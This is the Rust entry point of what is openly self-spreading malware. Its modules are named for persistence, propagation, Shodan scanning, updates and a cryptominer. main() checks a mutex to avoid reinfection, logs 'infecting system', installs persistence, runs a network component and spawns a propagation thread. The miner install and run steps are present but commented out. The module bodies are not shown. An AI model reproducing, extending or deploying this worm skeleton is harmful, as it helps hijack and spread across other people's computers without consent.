mod persistance;
mod propogate;
mod network;
mod update;
mod shodan;
mod miner;
mod mutex;

use network::Network;
use miner::Miner;

use env_logger::{Builder, Env};
use log::{info, warn};


fn main() -> Result<(), Box<dyn std::error::Error>> {
    Builder::from_env(Env::default().default_filter_or("info")).init();

    match mutex::lock() {
        Some(_) => {
            info!("infecting system");

            persistance::init();

            /*
            let miner = Miner::new();

            miner.install()?;

            miner.enable_huge_pages();

            miner.run()?;
            */

            let mut network = Network::new();

            let propogate = propogate::spawn(network.should_close());

            network.run()?;

            info!("waiting for propogate to finish");

            let _ = propogate.join();
        },
        None => {
            warn!("already infected");
        },
    }

    Ok(())
}


